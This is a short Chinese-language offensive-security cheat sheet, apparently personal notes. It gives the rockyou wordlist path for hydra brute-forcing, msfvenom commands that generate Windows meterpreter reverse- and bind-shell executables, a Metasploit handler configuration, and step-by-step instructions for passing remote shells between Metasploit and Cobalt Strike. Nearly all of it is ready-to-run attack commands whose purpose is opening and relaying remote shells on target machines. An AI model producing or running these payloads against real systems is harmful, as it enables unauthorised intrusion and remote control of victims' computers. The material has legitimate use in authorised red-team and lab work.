
## 爆破

hydra

rockyou 文件路径
/usr/share/wordlists/rockyou.txt

## MSF常用指令

生成meterpreter

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.10 LPORT=4444  -f exe > 1.exe

msfvenom -p windows/x64/meterpreter/bind_tcp RPORT=4444  -f exe > 1.exe
```

监听端口

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 4444
run
```

## metasploit与Cobaltstrike互相派生shell

### msf -> coblatstrike

msf 派生 shell 给 Cobalt strike（前提有一个meterpreter）,Coblat要监听HTTP类型，IP端口为LHOST、LPORT

```bash
msf exploit(handler) >  use exploit/windows/local/payload_inject
msf exploit(payload_inject) >  set PAYLOAD windows/meterpreter/reverse_http
msf exploit(payload_inject) > set DisablePayloadHandler true
msf exploit(payload_inject) > set LHOST 192.168.229.143
msf exploit(payload_inject) > set LPORT 1212
msf exploit(payload_inject) > set SESSION 1
msf exploit(payload_inject) > exploit
```

### coblatstrike -> msf

Cobalt strike 派生 shell 给 MSF(前提有个beacon shell)

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.100
lhost => 192.168.1.100
msf exploit(handler) > set lport 5555
lport => 5555
msf exploit(handler) > exploit
```

之后使用Cobalt Strike创建一个
windows/foreign/reverse_tcp Listener
其中ip为msf的ip地址，端口为msf所监听的端口。
然后选中计算机，右键->Spawn，选择刚刚创建的监听器
msf中即可看到成功获取了meterpreter会话
